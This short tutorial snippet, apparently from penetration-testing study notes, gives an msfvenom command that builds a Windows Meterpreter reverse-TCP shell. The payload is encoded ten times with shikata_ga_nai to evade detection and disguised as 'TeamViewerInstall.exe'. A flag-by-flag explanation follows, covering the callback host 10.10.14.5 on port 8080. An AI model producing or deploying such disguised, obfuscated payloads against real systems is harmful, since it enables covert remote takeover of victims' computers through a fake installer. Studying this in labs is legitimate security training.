multiple encoding:
```shell-session
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```

- `-a x86`: Specifies the architecture as x86.
- `--platform windows`: Sets the target platform as Windows.
- `-p windows/meterpreter/reverse_tcp`: Specifies the payload to use, which is a reverse TCP Meterpreter shell for Windows.
- `LHOST=10.10.14.5`: Sets the local host IP where the reverse shell will connect back.
- `LPORT=8080`: Sets the local port number on which the reverse shell will connect back.
- `-e x86/shikata_ga_nai`: Specifies the encoder to use. `x86/shikata_ga_nai` is a polymorphic XOR additive feedback encoder used for obfuscation.
- `-f exe`: Specifies the output format as an executable file.
- `-i 10`: Sets the number of iterations for encoding. In this case, it's set to 10 iterations.
- `-o /root/Desktop/TeamViewerInstall.exe`: Specifies the output file path and name where the generated payload will be saved. In this case, it will be saved as `TeamViewerInstall.exe` on the Desktop of the root user.
